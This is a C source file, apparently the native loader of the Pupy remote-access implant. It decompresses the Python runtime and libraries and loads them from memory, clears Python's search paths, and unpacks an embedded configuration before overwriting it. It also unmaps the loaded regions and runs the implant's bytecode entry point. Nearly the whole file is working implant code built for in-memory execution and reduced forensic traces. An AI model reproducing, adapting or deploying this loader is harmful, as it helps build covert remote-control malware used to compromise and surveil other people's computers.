/* **************** Python-dynload.c **************** */

#include "Python-dynload.h"
#include "Python-dynload-os.h"

typedef struct dependency {
    const char* name;
    const char *bytes;
    size_t size;
    BOOL is_python;
} dependency_t;

struct py_imports py_sym_table[] = {
#include "import-tab.c"
    { NULL, NULL }, /* sentinel */
};

static char __config__[262144] = "####---PUPY_CONFIG_COMES_HERE---####\n";
static PyGILState_STATE restore_state;
static BOOL is_initialized = FALSE;


#include "lzmaunpack.c"
#include "library.c"


static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize, void *arg) {
    HMODULE hModule;
    void *uncompressed = NULL;
    size_t uncompressed_size = 0;

    dprint("Uncompressing %s from %p (size=%d\n)\n", libname, xzbuf, xzsize);

    uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);

    if (!uncompressed) {
        dprint("%s decompression failed\n", libname);
        return NULL;
    }

    dprint("%s decompressed to %p (size=%d)\n", libname, uncompressed, uncompressed_size);

    hModule = MemLoadLibrary(
        libname, (char *) uncompressed, uncompressed_size, arg
    );

#if FREE_HMODULE_AFTER_LOAD
    lzmafree(uncompressed, uncompressed_size);
#endif

    if (!hModule) {
        dprint("loading %s from memory failed\n", libname);
        return NULL;
    }

    return hModule;
}


BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
    HMODULE hPython = NULL;
    PyObject *py_argv = NULL;
    PyObject *py_empty_list = NULL;
    dependency_t dependencies[] = DEPENDENCIES;
    resolve_symbol_t resolver = NULL;
    dependency_t *dependency = NULL;
    struct py_imports *py_sym = NULL;
    int i;

    if (is_initialized) {
        return TRUE;
    }

    for (dependency=dependencies; !hPython; dependency ++) {
        HMODULE hModule = CheckLibraryLoaded(dependency->name);

        if (hModule) {
            if (dependency->is_python) {
                hPython = hModule;
                resolver = OSResolveSymbol;
            }

            continue;
        }
        
        dprint("Loading %s\n", dependency->name);

        hModule = xz_dynload(
            dependency->name, dependency->bytes, dependency->size, NULL
        );

        dprint("Loaded %s -> %p\n", dependency->name, hModule);

        OSUnmapRegion(dependency->bytes, dependency->size);

        if (!hModule) {
            dprint("%s: load failed\n");
            return FALSE;
        }

        if (dependency->is_python) {
            hPython = hModule;
            resolver = MemResolveSymbol;
        }
    }

    dprint("Loading python from %p\n", hPython);

    for (py_sym = py_sym_table; py_sym->name; py_sym ++) {
        py_sym->proc = (void (*)()) resolver(hPython, py_sym->name);
        if (py_sym->proc == NULL) {
            dprint("undefined symbol %s\n", py_sym->name);
            return FALSE;
        }
    }

    PyEval_InitThreads();
    if(!Py_IsInitialized()) {
        char * ppath = Py_GetPath();
        if (ppath)
            memset(ppath, '\0', strlen(ppath));

        Py_FileSystemDefaultEncoding = FILE_SYSTEM_ENCODING;
        Py_IgnoreEnvironmentFlag = 1;
        Py_NoSiteFlag = 1;
        Py_NoUserSiteDirectory = 1;
        Py_OptimizeFlag = 2;
        Py_DontWriteBytecodeFlag = 1;

        Py_SetProgramName(OSGetProgramName());
        Py_InitializeEx(is_shared_object? 0 : 1);
    }

    restore_state = PyGILState_Ensure();

    py_empty_list = PyList_New(0);
    if (!py_empty_list) {
        dprint("Couldn't allocate list for sys.path\n");
        goto lbExit1;
    }

    PySys_SetObject("path", py_empty_list);

    dprint("SET ARGV (ARGC=%d; SHARED? %d)\n", argc, is_shared_object);

    if (is_shared_object) {
        if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
            argv[1] = argv[0];
            argc -= 1;
            argv += 1;
        } else {
            argc = 1;
        }
    }

    py_argv = PyList_New(0);
    if (!py_argv) {
        dprint("Couldn't allocate list for argv\n");
        goto lbExit1;
    }

    Py_IncRef(py_argv);

    for (i = 0; i<argc && argv[i]; i++) {
        PyList_Append(py_argv, PyString_FromString(argv[i]));
    }

    PySys_SetObject("executable", PyString_FromString(OSGetProgramName()));
    PySys_SetObject("argv", py_argv);

    Py_DecRef(py_argv);

    setup_jvm_class();

    dprint("Python initialized\n");
    return TRUE;

lbExit1:
    return FALSE;
}

void run_pupy() {
    union {
        unsigned int l;
        unsigned char c[4];
    } len;

    PyObject *py_config_list;
    PyObject *py_config;
    PyObject *py_pupylib;
    PyObject *py_stdlib;
    PyObject *pupy;
    PyObject *pupy_dict;
    PyObject *pupy_init;
    PyObject *pupy_init_bytecode;
    PyObject *py_eval_result;
    PyObject *py_builtins;
    PyObject *py_debug;
    PyObject *py_main;

    char *pupy_init_bytecode_c;
    Py_ssize_t pupy_init_bytecode_c_size;

    dprint("Load config\n");
    len.c[3] = __config__[0];
    len.c[2] = __config__[1];
    len.c[1] = __config__[2];
    len.c[0] = __config__[3];

    if (len.l == 0x23232323) {
        dprint("Config not found\n");
        goto lbExit1;
    }

    dprint("Config size: %d\n", len.l);

    py_config_list = PyObject_lzmaunpack(__config__+4, len.l);
    dprint("Config parcel unpacked: %p\n", py_config_list);
    if (!py_config_list) {
        dprint("Config unpack failed\n");
        goto lbExit2;
    }

    dprint("Cleanup config\n");
    memset(__config__, 0xFF, len.l + 4);
    
    dprint("Stdlib size: %d\n", library_c_size);
    py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
    if (!py_stdlib) {
        goto lbExit3;
    }

    dprint("Stdlib unpacked: %p\n", py_stdlib);

    dprint("Unmap stdlib..\n");
    OSUnmapRegion(library_c_start, library_c_size);
    OSUnmapRegion(__config__, len.l);
    dprint("Unmap stdlib.. done\n");

    py_config = PyList_GetItem(py_config_list, 0);
    dprint("Get config: %p\n", py_config);

    py_pupylib = PyList_GetItem(py_config_list, 1);
    dprint("Get pupy: %p\n", py_pupylib);

    dprint("Update stdlib\n");
    PyDict_Update(py_stdlib, py_pupylib);

    Py_IncRef(py_config);

    Py_DecRef(py_config_list);

    pupy = PyImport_AddModule("pupy");
    dprint("Add pupy module: %p\n", pupy);

    dprint("Set pupy module base arguments..\n");
    PyObject_SetAttrString(
        pupy, "__file__", PyString_FromString("pupy://pupy/__init__.pyo"));
    PyObject_SetAttrString(
        pupy, "__package__", PyString_FromString("pupy"));
    PyObject_SetAttrString(
        pupy, "__path__", Py_BuildValue("[s]", "pupy://pupy"));
    dprint("Set pupy module base arguments.. done\n");

    pupy_init = PyDict_GetItemString(py_stdlib, "pupy/__init__.pyo");

    dprint("pupy/__init__.pyo at %p\n", pupy_init);

    Py_IncRef(pupy_init);
    PyDict_DelItem(py_stdlib, pupy_init);

    PyString_AsStringAndSize(
        pupy_init, &pupy_init_bytecode_c, &pupy_init_bytecode_c_size);

    dprint(
        "pupy/__init__.pyo bytecode=%p size=%d\n",
        pupy_init_bytecode_c, pupy_init_bytecode_c_size);

    pupy_init_bytecode = PyMarshal_ReadObjectFromString(
        pupy_init_bytecode_c + 8, pupy_init_bytecode_c_size - 8
    );

    Py_DecRef(pupy_init);

    dprint("Unmarshalled bytecode: %p\n", pupy_init_bytecode);

    pupy_dict = PyModule_GetDict(pupy);
    Py_IncRef(pupy_dict);

    py_builtins = PyEval_GetBuiltins();
    dprint("Builtins at %p\n", py_builtins);

    PyDict_SetItemString(pupy_dict, "__builtins__", py_builtins);

    dprint("Evaluate pupy bytecode: %p -> %p\n", pupy_init_bytecode, pupy_dict);
    py_eval_result = PyEval_EvalCode(
        pupy_init_bytecode, pupy_dict, pupy_dict);
    Py_DecRef(pupy_dict);
    dprint("Evaluation completed: %p\n", py_eval_result);

    Py_DecRef(pupy_init_bytecode);

    if (!py_eval_result) {
        PyErr_Print();
    } else {
        Py_DecRef(py_eval_result);
    }

    dprint("Call pupy.run\n");

    py_main = PyDict_GetItemString(pupy_dict, "main");
#ifdef DEBUG
    py_debug = PyBool_FromLong(1);
#else
    py_debug = PyBool_FromLong(0);
#endif

    Py_IncRef(py_main);

    dprint(
        "Call pupy.run: %p(%p, %p, %p)\n",
        py_main, Py_None, py_debug, py_config
    );

    Py_IncRef(Py_None);
    py_eval_result = PyObject_CallFunctionObjArgs(
        py_main, Py_None, py_debug, py_config, py_stdlib, NULL);

    Py_DecRef(py_main);
    Py_DecRef(Py_None);

    if (!py_eval_result) {
        PyErr_Print();
    } else {
        Py_DecRef(py_eval_result);
    }

    dprint("Completed\n");

lbExit3:
    Py_DecRef(py_stdlib);

lbExit2:
    Py_DecRef(py_config);

lbExit1:
    dprint("Exit\n");
}

void deinitialize_python() {
    dprint("Deinitialize python\n");
    PyGILState_Release(restore_state);
    Py_Finalize();
}